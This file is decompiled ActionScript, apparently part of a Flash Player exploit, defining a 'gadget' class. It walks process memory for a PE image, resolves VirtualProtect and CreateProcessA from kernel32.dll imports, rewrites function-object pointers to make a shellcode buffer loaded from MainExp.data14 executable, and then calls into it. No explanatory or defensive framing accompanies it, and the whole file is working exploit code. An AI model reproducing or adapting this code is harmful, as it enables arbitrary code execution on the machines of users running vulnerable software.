package
{
   class gadget extends Primit
   {
      
      static var CreateProcessFunc:uint;
      
      static var method_2:uint;
       
      
      function gadget()
      {
         super();
      }
      
      static function flash1000(param1:uint = 0, ... rest) : *
      {
      }
      
      static function findfunc() : uint
      {
         var b0:uint = 0;
         var b:uint = 0;
         var var_12:uint = 0;
         var size:uint = 0;
         var oft:uint = 0;
         var ft:uint = 0;
         var gadget3:uint = 0;
         var c:int = 0;
         try
         {
            for(b0 = flash32(flash35(flash21)) & 4294901760,b = b0 - 8388608; var_12 < 512; )
            {
               if((flash32(b) & 65535) == 23117)
               {
                  b0 = 0;
                  break;
               }
               var_12++;
               b = b - 65536;
            }
            if(!b0)
            {
               method_2 = b;
               b0 = b + flash32(b + 60);
               if(flash32(b0) == 17744)
               {
                  size = flash32(b0 + 132);
                  for(b0 = b + flash32(b0 + 128),var_12 = 3 * 4; var_12 < size; var_12 = var_12 + 5 * 4)
                  {
                     flash21.position = b + flash32(b0 + var_12);
                     if(flash21.readUTFBytes(12).toLowerCase() == "kernel32.dll")
                     {
                        oft = flash32(b0 + var_12 - 3 * 4);
                        ft = flash32(b0 + var_12 + 4);
                        break;
                     }
                  }
                  if(!(oft == 0 || ft == 0))
                  {
                     oft = oft + b;
                     var_12 = 0;
                     while(var_12 < 256)
                     {
                        b0 = flash32(oft);
                        if(b0 == 0)
                        {
                           throw new Error("");
                        }
                        flash21.position = b + b0;
                        if(flash21.readUTF().toLowerCase() == "virtualprotect")
                        {
                           gadget3 = flash32(b + ft + var_12 * 4);
                           c++;
                           if(c > 1)
                           {
                              break;
                           }
                        }
                        else
                        {
                           flash21.position = b + b0;
                           if(flash21.readUTF().toLowerCase() == "createprocessa")
                           {
                              CreateProcessFunc = flash32(b + ft + var_12 * 4);
                              c++;
                              if(c > 1)
                              {
                                 break;
                              }
                           }
                        }
                        var_12++;
                        oft = oft + 4;
                     }
                     return gadget3;
                  }
                  throw new Error("");
               }
               throw new Error("");
            }
            throw new Error("");
         }
         catch(e:Error)
         {
            throw new Error("");
         }
         return 0;
      }
      
      static function method_5(param1:uint, param2:uint, param3:uint) : *
      {
         var _loc4_:uint = 0;
         flash1000();
         var _loc5_:uint = flash35(flash1000);
         var _loc6_:uint = flash32(flash32(flash32(_loc5_ + 8) + 20) + 4) + (!!flash70?188:176);
         if(flash32(_loc6_) < 65536)
         {
            _loc6_ = _loc6_ + 4;
         }
         _loc6_ = flash32(_loc6_);
         var _loc7_:uint = flash32(_loc6_);
         var _loc8_:uint = flash32(_loc5_ + 28);
         var _loc9_:uint = flash32(_loc5_ + 32);
         var _loc10_:Vector.<uint> = new Vector.<uint>(256);
         while(_loc4_ < 256)
         {
            _loc10_[_loc4_] = flash32(_loc7_ - 128 + _loc4_ * 4);
            _loc4_++;
         }
         _loc10_[32 + 7] = param1;
         flash34(_loc5_ + 28,param2);
         flash34(_loc5_ + 32,param3);
         flash34(_loc6_,flash36(_loc10_) + 128);
         var _loc11_:Array = new Array(65);
         var _loc12_:* = flash1000.call.apply(null,_loc11_);
         flash34(_loc6_,_loc7_);
         flash34(_loc5_ + 28,_loc8_);
         flash34(_loc5_ + 32,_loc9_);
      }
      
      static function flash20() : *
      {
         var s:int = 0;
         var flash2003:Array = null;
         var flash2005:Vector.<uint> = null;
         var res:* = undefined;
         var flash2004:String = null;
         try
         {
            flash2003 = [];
            MainExp.data14.position = 0;
            for(s = 0; s < MainExp.data14.length; s = s + 4)
            {
               flash2003.push(MainExp.data14.readUnsignedInt());
            }
            flash2005 = Vector.<uint>(flash2003);
            var gadget4:uint = flash36(flash2005);
            var gadget7:uint = findfunc();
            if(gadget7 != 0)
            {
               method_5(gadget7,gadget4,flash2005.length * 4);
               var gadget8:uint = flash35(flash1000);
               gadget8 = flash32(flash32(gadget8 + 28) + 8) + 4;
               var gadget9:uint = flash32(gadget8);
               flash34(gadget8,gadget4);
               res = flash1000.call(null,CreateProcessFunc);
               flash34(gadget8,gadget9);
               return;
            }
            throw new Error("");
         }
         catch(e:Error)
         {
            throw new Error("");
         }
      }
   }
}
